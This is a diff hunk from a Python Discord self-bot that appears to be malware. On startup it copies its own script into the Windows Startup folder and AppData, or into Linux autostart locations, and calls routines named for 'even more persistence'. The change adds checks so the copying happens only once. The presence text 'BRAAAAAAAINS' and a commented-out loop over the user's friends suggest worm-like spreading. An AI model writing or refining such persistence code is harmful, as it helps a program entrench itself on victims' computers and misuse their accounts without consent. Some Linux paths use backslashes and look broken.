@@ -122,12 +122,16 @@ bot = commands.Bot(command_prefix=prefix, self_bot=True)
 @bot.event
 async def on_ready():
     if system == "Windows":
-        shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
-        shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\" + base)
+        if not os.path.isfile("C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base):
+            shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
+            shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\" + base)
+        else:
+            pass
         even_more_persistance_windows()
     if system == "Linux":
-        shutil.copy(__file__, home + ".config\\autostart" + base)
-        shutil.copy(__file__, home + ".config\\" + base)
+        if not os.path.isfile(home + ".config\\" + base):
+            shutil.copy(__file__, home + ".config\\autostart" + base)
+            shutil.copy(__file__, home + ".config\\" + base)
         even_more_persistance_linux()
     await bot.change_presence(activity=discord.Game(name="BRAAAAAAAINS"))
     #for friend in bot.user.friends:
